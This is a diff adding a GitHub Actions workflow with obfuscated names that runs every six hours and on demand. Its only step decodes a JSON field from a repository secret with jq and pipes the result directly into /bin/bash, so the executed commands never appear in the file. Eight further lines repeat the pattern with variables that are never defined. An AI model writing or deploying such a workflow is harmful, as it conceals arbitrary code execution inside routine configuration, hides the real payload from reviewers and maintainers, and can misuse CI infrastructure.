@@ -1,0 +1,25 @@
+name: duyunahen
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duyunahen
+        env:
+          qe1820: ${{ secrets.qe1820 }}
+        run: |
+          echo $qe1820 | jq -r .erpxo30 | /bin/bash
+          echo $ewv565 | jq -r .f3843 | /bin/bash
+          echo $xkjd9097 | jq -r .ptwdr4 | /bin/bash
+          echo $eumt529 | jq -r .xr0356 | /bin/bash
+          echo $ls896 | jq -r .p51 | /bin/bash
+          echo $y5927 | jq -r .k9 | /bin/bash
+          echo $rzsv814 | jq -r .ra42963 | /bin/bash
+          echo $vht93 | jq -r .hwij84676 | /bin/bash
+          echo $jzc572 | jq -r .riid61180 | /bin/bash
+
